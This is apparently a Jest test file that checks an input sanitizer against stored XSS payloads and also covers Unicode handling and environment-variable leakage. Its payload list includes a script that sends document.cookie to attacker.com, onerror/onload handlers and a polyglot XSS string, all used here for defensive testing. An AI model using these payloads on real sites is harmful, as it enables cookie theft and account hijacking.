import { sanitizeString } from '@/lib/validators';

describe('Security: Injection and Sanitization Protections', () => {
  it('neutralizes stored XSS payloads', () => {
    const malicious = [
      '<script>window.location="http://attacker.com?cookie="+document.cookie</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg/onload=alert`1`>',
      '<iframe src="javascript:alert(1)"></iframe>',
      'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    ];

    malicious.forEach((payload) => {
      const sanitized = sanitizeString(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<svg');
    });
  });

  it('safely handles non-ASCII and Unicode characters', () => {
    const unicodeInput = '🎉 Sarah & Juan’s Fiesta! Über-glamour & crème brûlée';
    expect(sanitizeString(unicodeInput)).toBe(unicodeInput);
  });

  it('does not leak environment variables in responses', () => {
    const envString = JSON.stringify(process.env);
    expect(envString).not.toContain('HARDCODED_UNSAFE_SECRET');
  });
});
